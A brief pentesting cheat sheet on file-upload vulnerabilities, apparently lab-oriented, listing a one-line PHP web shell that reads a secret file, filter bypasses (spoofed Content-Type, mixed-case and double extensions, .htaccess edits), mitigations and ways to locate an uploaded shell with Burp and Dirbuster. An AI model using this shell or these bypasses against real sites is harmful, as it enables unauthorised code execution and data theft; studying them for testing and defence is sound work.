# File Upload

## Concept
- با تغییر نام فایل آپلود شده در Burp می توانیم حملات XSS و RCE انجام دهیم

## Exploitation
- Basic PHP web shell to read a directory : ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```

## Bypass
- Content type
  - ```application/octet-stream``` => ```Content-Type: image/jpeg```
- Black list
  - Apache web server is case sensetive
    - ```.php``` => ```.PhP```  
  - modify htaccess (SEC542 - 7) 
- Double Extension
  - *wp.php* => *wp.php.gif* 

## Mitigation
- Never allow users to upload executable
- Check the file type & extension
- Analyze the uploaded file itself, recreate it and rename it (with library)

## Find Uploaded Shell
- Burp
  - Intruder > Payloads > Add Payload Processing > test
  - Suffix: ```.php```
- Dirbuster
  - Set *Target URL* & *File name* & *File Extension*
  - Set user/pass to auto matically login to site
  - Options > Advanced Options > Double Extension

## Tool
- [Weevely](/Tools/weevely.md)
